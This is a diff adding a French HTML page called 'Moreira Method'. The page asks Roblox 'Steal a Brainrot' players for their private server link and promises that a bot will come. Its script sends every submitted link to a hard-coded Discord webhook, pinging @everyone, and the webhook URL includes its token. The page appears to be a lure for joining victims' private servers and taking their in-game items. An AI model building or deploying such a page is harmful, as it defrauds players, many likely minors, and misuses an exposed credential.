@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Moreira Method</title>
+
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      color: white;
+
+      /* Image affichée entièrement */
+      background-image: url("https://i.pinimg.com/736x/65/ff/ac/65ffac58870464ef8dd93c38e56ebad5.jpg");
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-color: black;
+    }
+
+    .box {
+      width: 420px;
+      padding: 25px;
+      text-align: center;
+      background: rgba(0, 0, 0, 0.75);
+      border-radius: 10px;
+    }
+
+    h2 {
+      margin-bottom: 12px;
+      font-size: 30px;
+      color: #ff2b2b;
+    }
+
+    p {
+      font-size: 15px;
+      margin-bottom: 8px;
+    }
+
+    .info-text {
+      font-style: italic;
+      color: #ff8080;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      font-size: 15px;
+      border-radius: 6px;
+      border: none;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 15px;
+      padding: 12px;
+      font-size: 15px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      background: #ff2b2b;
+      color: white;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    .success {
+      margin-top: 15px;
+      color: #ff4d4d;
+      font-weight: bold;
+      display: none;
+    }
+
+    .error {
+      margin-top: 15px;
+      color: #ff0000;
+      font-weight: bold;
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="box">
+    <h2>Moreira Method</h2>
+    <p>Entrez votre lien de serveur privé Steal a Brainrot 🧠</p>
+    <p class="info-text">Rejoignez le serveur et attendez le bot</p>
+
+    <input id="psLink" placeholder="https://www.roblox.com/games/...">
+
+    <button onclick="send()">Submit</button>
+
+    <div class="success" id="success">✅ Lien envoyé avec succès</div>
+    <div class="error" id="error">❌ Erreur lors de l’envoi</div>
+  </div>
+
+  <script>
+    function send() {
+      const link = document.getElementById("psLink").value;
+      const successDiv = document.getElementById("success");
+      const errorDiv = document.getElementById("error");
+
+      successDiv.style.display = "none";
+      errorDiv.style.display = "none";
+
+      if (!link) {
+        alert("Entrez un lien !");
+        return;
+      }
+
+      fetch("https://discord.com/api/webhooks/1462081520184594634/ovqFUvtGEzZwTtiuE44rGWGeZGNCgFtXzrFjKVku80x9pHgk1Uu69gchfw5KMbpe3Qz6", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: "# @everyone 🧠 Nouveau lien de serveur Roblox – Steal a Brainrot",
+          embeds: [{
+            description: "🔗 " + link,
+            color: 16711680
+          }]
+        })
+      })
+      .then(res => {
+        if (res.ok) {
+          successDiv.style.display = "block";
+        } else {
+          errorDiv.style.display = "block";
+        }
+      })
+      .catch(() => {
+        errorDiv.style.display = "block";
+      });
+    }
+  </script>
+
+</body>
+</html>
